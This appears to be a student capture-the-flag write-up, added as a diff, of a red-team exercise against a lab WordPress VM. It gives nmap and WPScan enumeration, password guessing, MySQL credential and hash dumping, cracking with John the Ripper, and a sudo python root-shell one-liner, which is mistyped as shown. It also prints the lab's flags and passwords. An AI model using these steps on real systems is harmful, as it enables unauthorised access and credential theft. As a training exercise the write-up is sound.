@@ -1,0 +1,116 @@
+##Red Team: Summary of Operations
+
+Table of Contents
+
+- Exposed Services
+- Critical Vulnerabilities
+- Exploitation
+
+Exposed Services
+
+Nmap scan results for each machine reveal the below services and OS details:
+
+- $ nmap -sV -A 192.168.1.100
+
+!C:\Users\Nanneys\Final-Project\Images\NMAP_scan.png
+
+This scan identifies the services below as potential points of entry for Target 1:
+
+- Port 22/TCP Open SSH
+- Port 80/TCP Open HTTP
+- Port 111/TCP Open rpcbind
+- Port 139/TCP Open netbios-ssn
+- Port 445/TCP Open netbios-ssn
+
+The following vulnerabilities were identified on the Target 1 VM:
+
+- User enumeration 
+- Weak user passwords
+- No use of salt on hashed passwords
+- Misconfigured user privileges
+
+Exploitation
+
+The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
+
+- Flag1.txt: b9bbcb33e11b80be759c4e8448622482d
+
+- Exploit Used
+  - WPScan was used to enumerate users on the WordPress site
+  - $ wpscan --url http://192.168.1.110/Wordpress --enumerate u
+
+!C:\Users\Nanneys\Final-Project\Images\Enumeration.png
+
+  - After enumerating users, guessed user Michael’s password: michael
+  - Connected via SSH using Michael’s credentials.
+    - $ ssh michael@192.168.1.110 
+  - Found first flag in /var/www/html/service.html directory and file by using following command:
+    - $ grep -ir flag1 /var/www 
+
+!C:\Users\Nanneys\Final-Project\Images\Flag1.png
+
+- Flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
+
+- Exploit Used
+  - Used similar commands to search directories and files in Michael’s machine.
+  - Search through Michael’s directories uncovered the second flag:
+
+!C:\Users\Nanneys\Final-Project\Images\Flag2.png
+
+- Flag3.txt: afc01ab56b50591e7dccf93122770cd2
+
+- Exploit Used
+  - Searching for file name, located the wp-config.php containing Michael’s mysql login credentials, including password: R@v3nSecurity
+
+!C:\Users\Nanneys\Final-Project\Images\SQL_creds.png
+
+  - Logged into mysql with following command
+    - $ mysql -u root - p wordpress
+  - Ran the following sql commands to enumerate the tables:
+    - show databases;
+    - use wordpress;
+    - show tables;
+
+!C:\Users\Nanneys\Final-Project\Images\mysql_table.png
+
+    - select * from wp_posts;
+
+!C:\Users\Nanneys\Final-Project\Images\Flag3.png
+
+    - select * from wp_users;
+
+!C:\Users\Nanneys\Final-Project\Images\Hashed_passwords.png
+
+  - On the Kali machine, the hashed passwords (displayed above) were cracked using John the Ripper:
+    - $ john wp_hashes.txt
+
+!C:\Users\Nanneys\Final-Project\Images\Steve_password.png
+
+  - Steven’s password was obtained: pink84
+
+- Flag4.txt: 715dea6c055b9fe3337544932f2941ce
+
+- Exploit Used
+  - Connected via SSH using Steven’s credentials
+    - $ ssh steven@192.168.1.110
+
+!C:\Users\Nanneys\Final-Project\Images\Steve_account.png
+
+  - Attempted to switch to root by enumerating sudo privileges:
+    - $ sudo -l
+
+!C:\Users\Nanneys\Final-Project\Images\Steve_sudo.png
+
+  - Escalated to root by using the following python command:
+    - $ sudo python -c ‘import pty: pty.spawn(*/bin/sh”)’
+
+! C:\Users\Nanneys\Final-Project\Images\Python_command.png
+
+  - With access to root, found the 4th flag:
+
+!C:\Users\Nanneys\Final-Project\Images\Flag4.png
+
+
+
+
+[flag4]
